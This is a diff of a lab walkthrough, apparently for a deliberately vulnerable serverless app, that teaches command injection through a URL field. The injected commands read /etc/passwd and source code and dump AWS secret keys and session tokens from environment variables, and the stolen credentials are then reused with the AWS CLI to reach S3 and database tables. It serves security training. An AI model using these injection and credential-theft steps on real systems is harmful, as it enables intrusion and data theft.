@@ -15,19 +15,19 @@ This loads a A Poison Tree poem with a URL that seems remarkably close to an s3 
 1. Click back on the browser to return to the page 
 2. Attempt **Function Data Injection** by adding code to the end of the URL  
 *e.g. try adding*`; pwd`
-3. Click submit to load the original poem as well as garbeled information  
+3. Click submit to load the original poem as well as **Improper Exception Handling and Verbose Error**  
   *this appears to be vulnerable to __Function Data Injection__*
 ### Improved injection attempts
 1. Click back and change the URL form to a URL that doesn't contain a doc file followed by a snippet of code  
 e.g. `https://inject; pwd`
-2. Click submit to load the current working directory */var/task*
-3. Repeat this tasks with the following bash code add for more information  
+2. Click submit to load the current working directory */var/task* 
+3. Repeat this tasks with the following bash code add for more information resulting from **Over-Privileged Function Permissions**
 **Document everything for later**    
 `https://inject; whoami`
    *Current user should be sbx-user0666 or similar*   
 `https://inject; ls -la`
     *Lists the current directory (index.js + node_modules subdirectory)*   
-`https://inject; cat /etc/passwd`
+`https://inject; cat /etc/passwd` 
   *Lists current users*  
 `https://inject; cat index.js`
     *Provides code for basic information on how this page functions*   
@@ -46,17 +46,22 @@ e.g. `https://inject; pwd`
   `https://inject; cat node_modules/node-uuid/package.json`  
   *lists package version*  
   Research into this version of UUID results in a known vulnerability to insecure randomness  
-  **TL:DR;** math.random can produce predictable values  
+  **TL:DR;** math.random can produce predictable values and this in an **Insecure 3rd Party Dependency**  
   keys generated and for storage in the s3 bucket may be predicted  
   This could be *very* interesting if it was used to store PII, but it isn't for this circumstance  
  6. Check for unsecured environmental variables  
  `https://inject; env`  
- Results in *very* useful information: 
+ Results in **Insecure Application Secrets Storage**: 
        * aws_session_token
        * aws_secret_access_key
        * aws_access_key
        * table name
        * s3 bucket name
+
+### Enumerating Permissions
+Obtain current profile information   
+**requires the profile information to be configured** *see Table Access with AWS CLI*
+`aws sts get-caller-identity --profile user666`
 
 ## Access S3 Bucket & Tables
 ### S3 Bucket Access with No Credentials
@@ -74,9 +79,10 @@ Return to the previous tab
 
 ### Table Access with AWS CLI
 1. Using the information found in the env variables create a user profile 
-`aws configure profile --user`  
+`aws configure profile --user666`  
     * aws_secret_access_key    
     * aws_access_key   
+    * us-east-1
 2. Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
 `vim ~/.aws/credentials`  
 `aws_session_token = <aws_session_token>`
